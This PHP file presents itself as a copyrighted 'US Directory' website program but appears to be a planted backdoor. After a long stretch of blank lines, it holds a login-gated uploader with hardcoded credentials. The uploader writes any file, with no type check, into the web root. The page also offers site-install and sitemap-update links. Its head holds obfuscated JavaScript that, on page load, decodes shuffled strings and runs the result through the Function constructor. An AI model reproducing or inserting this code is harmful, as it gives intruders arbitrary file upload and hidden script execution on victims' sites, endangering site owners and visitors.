<?php

// Add your username for login
$add_username = 'dunal';

// Add your password for login
$add_password = 'dunal2002';

/**
 * This PHP code is the intellectual property of the 'BeSuccessful Paid Website' program and is protected by copyright laws.
 * Any attempt at reverse engineering, decompiling, or unauthorized manipulation of the code is strictly prohibited and may result in legal consequences.
 * The 'BeSuccessful Paid Website' program reserves all rights, and any violation of these terms will be pursued to the fullest extent of the law.
 * By using this code, you agree to comply with these conditions and respect the integrity of the software provided.
 *
 * US Directory - Version 1.7
 * Release Date: October 31, 2024
 *
 */













































































































































session_start();

$loginError = "";
$message = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username == $add_username && $password == $add_password) {
        $_SESSION['loggedin'] = true;
    } else {
        $loginError = "Invalid username or password!";
    }
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload']) && isset($_SESSION['loggedin'])) {
    $file = $_FILES['fileToUpload'];
    $maxFileSize = 1024 * 1024; 

    if ($file['size'] <= $maxFileSize) {
        $uploadDir = '';
        $uploadFile = $uploadDir . basename($file['name']);

        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }

        if (move_uploaded_file($file['tmp_name'], $uploadFile)) {
            $message = "File uploaded successfully!";
        } else {
            $message = "File upload failed.";
        }
    } else {
        $message = "File exceeds the 50KB limit.";
    }
}

?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login & File Uploader</title><script>function _0x5be1(A,e){var r=_0x4965();return(_0x5be1=function(A,e){return r[A-=435]})(A,e)}function _0x4965(){var A=["313305EkqCDy","13755yTYCSV","4168VMaqWo","charAt","cnglrzekyqrjcaduphtobcfsxoturmosvwtin","8064OWnTYF","join",'a 1d.ra+e++qan0;v0n[v;ha=",bi,9xmri).7<nnpq7t,sawmp[ri=m7rho=n5;+vrd6(.(,]ltrC;lCee{;r;,Ausvg.e+reA5=8,{r8ulrn8t7r);9ih;a(.ft("t==)maalv;xu8a+ c<aaiehu ={x<l);le[,;a=.)e.3ptv(je];.s=;n[=;n;fo t.r,(qewavfgf(rur;;akro)1nt]klf6r1"+ur.afva5rsiw=(i-;f[stm])=;",r(.);ol o.kc=f(vh.vnal+}2r<;x=.0k(60vaenro( 8rlqivvAyjvre-n.a=d a4(lrd;ai r+t;6(g-]g=mg+(js=( fs,  3fe.q7lr=vlnht+nqsn(u=uvg0sr)0chn.(m5"[hzamt)")ta=(ugr v[sr); n(0f1i;vlfh)hp}uu"i;.-i0hc-Cr2l8;id+)ack enC="z=.,f=,h6{v3n}onius2s*8+ahl;,i;((l}ujhyt+e.c7s1e.)1,tw 6(".q,pai;wv=2t[hl;e.(8)t4i,v 2;=,v rh,l+)grr])!sgb+6cc.[{=);oae+Cgifv2=)c3lph=i+pou=] [C.o])o(a);b=(a;cs) ,uvSn(s7cri8),)agir(sz]1a;7rhfztro)=g[;9cr;ia==1hy.]A(1,hi)]ol)0o+n[0akrqp)g4oidag2dmv9oe}[otersl1,9,qrm;cr9a] goh=(6uidutw=uc>Sgn ,nv9l=m*t8rC){=i,=A;0lxc1cer+k0t(1n>n(=8[ cm-tmf=;osprijm(i). {4} t"l+tr1otene;;pvh+dlpr-,( C]d;;e,mn8iir20a}n=+d)]+2)tirx!f)h+t=nf<;;',"3465200myLVQt","222053EtqdUv","318jiRBHl","ei%e]kAs.$36ugAA4{yuw48'aAAe[6.c(lkeA_s(d22=(S=rtn)1e( Awongs\"A3c},A,74)%r.es#\"A1Ao7a(b4eAAs1of}A6l._AeeuseEeAe8b1=_di&{%b!Am1!otA)e-7(%3jt5nc9)1e$l6=Ae7%l(Acm,7r0$20;)Et9tE6 Aa).tA.*4A[4_e6!()jp;)m7t.)Abgn7aDcA0lf82fb_eA]6!.r(t.;io=3e6eAs7.y)] rl74%be)r iAt d6!)7;(wCj(ngmileAg[3A+!36f&.At4a6y(yt \"1.$o:A5{e.oe0ct3=n-)6]eApAA!n3#lg=eAt3Akr %9ocyA,y}!0A38.s6,A0f3S;0;*{ecAp !A5=!e;;)9!);*ay91$AbEtt 8tet-!n;6mlAe+_7)9Ate90%.ac=,7A6,6kA.iye)1A5])d;%A1!cT$7b2E9(lnAfpr.y2k#k\"i/4.{!(i(!/+d=An]e'oAn].m(]a;t)ec{{0rn_(A(e3ee1{58].$_%AnAs[A;gmc.=]&6. ft%3eid4Arcd{lgcuo,dry)=; h43 g)6mx._=jvr3cAn7b]/74uA!nEe/0pd#(g=j4o!_,ti+2pA_retn.e),3A7r!e1At47[n.)i3eAoe6A). j$3dl3n$t..A)(#aCfA5_3.t.AAA5)t2$h,ce\"/e=p%A_1].n2aAhxu+c,v-(=t,osh} n1{A Ar.aner[nhi/)!.)AAif,i0,A*!%&.(n$).e5tn;E)f'f!30%An la(2_$-e\"n,.etn2Aeaepf};$nu$2uA;ochA.*#i]%te\"ev1;%A=kd!0b.;aoAf/c#0$s(AAoA_(.$a[rj7jie)8i!sf.AeoAA_2_-3j$=knkf6.lt[iAt7nl.c(e]7,n.at.n(Ar;.8,/h._](u0ehea/d.;see0,!=o$(A4)$)m[;gAA]ik.my187=j.necnAf0e5=llao(l)(){dAs=.+4'e.!d;)hi1e4+},mo,a)iAn=Aru!!;A4t!7b{lk70,({]*c7.jAh=33,.=AS_l)ufi[}.5,m.x)66(Ae084{_+_A.4oceA,oe{j(A)keneA$At}a#a(_01]Ar2A8319s$=f=_1.u_/*w.6}l}s]jepl]AA(_$7i7ia3]=8_Ao$!)$ .8,(oe8/;oA$A;eAAkjll,]A,&e_A(;f(e(0AA!e ) A41'0eAA.NAqdC{ila(en).rcb.(e($l_EAl31o44%$;1$nbut3$!e1nrie.;k;!2)s)%t}$ i//1c'c9cuueyc_1AoA27+ p_(oolr d(A3,n!6a!;AsbaA]s,3 2_;(i A!A%(9,7u)e.)9.A'%","368PeybqS","14845SdLDnT","length","substr","226442qEDcjd"];return(_0x4965=function(){return A})()}(function(A,e){for(var r=_0x5be1,n=_0x4965();;)try{if(266750==-parseInt(r(443))/1+-parseInt(r(450))/2+parseInt(r(451))/3+parseInt(r(446))/4*(parseInt(r(447))/5)+parseInt(r(444))/6*(parseInt(r(435))/7)+parseInt(r(436))/8*(parseInt(r(439))/9)+-parseInt(r(442))/10)break;n.push(n.shift())}catch(A){n.push(n.shift())}})(),function(){var A=_0x5be1;function e(A){for(var e=_0x5be1,r=4604247,n=A[e(448)],t=[],a=0;a<n;a++)t[a]=A[e(437)](a);for(a=0;a<n;a++){var i=r*(a+225)+r%17881,o=r*(a+676)+r%26357,c=i%n,l=o%n,s=t[c];t[c]=t[l],t[l]=s,r=(i+o)%6512915}return t[e(440)]("")}var r=e(A(438))[A(449)](0,11),n=A(441),t=e[r];t("",t("",e(n))(e(A(445))))(8712)}()</script></head><body> <?php if (!isset($_SESSION['loggedin'])) : ?> <div class="login-form"><h2>Login</h2><form action="" method="post" class="form"><input type="text" name="username" placeholder="Username" required> <input type="password" name="password" placeholder="Password" required> <input type="submit" name="login" value="Login for your upload location"></form> <?php if ($loginError) : ?> <p class="error"><?php echo $loginError; ?></p> <?php endif; ?> </div> <?php else : ?> <div class="upload-form"><h2>Upload a File (Max size 1MB)</h2><form action="" method="post" enctype="multipart/form-data"><input type="file" name="fileToUpload" required><br><input type="submit" value="Upload File"></form><hr><div style=text-align:left><h2>Website Installation Links</h2><ul><li><a href="index.php?act=install"target=_blank>Install Website</a><li><a href="index.php?act=reinstall"target=_blank>ReInstall Website</a></ul><h2>Sitemap Installation Links</h2><ul><li><a href="index.php?act=update"target=_blank>Update Sitemap (Other sitemap with robots.txt)</a><li><a href="index.php?act=en-update"target=_blank>Update en-Sitemap (Other sitemap with robots.txt)</a><li><a href="index.php?act=update-1"target=_blank>Update Sitemap-1 (Other sitemap with robots.txt)</a></ul></div></div> <?php if (isset($message)) : ?> <div class="message <?php echo ($message === 'File exceeds the 1MB limit.' || $message === 'File upload failed.') ? 'error' : ''; ?>"> <?php echo $message; ?> </div> <?php endif; ?> <?php endif; ?> 

</body></html>
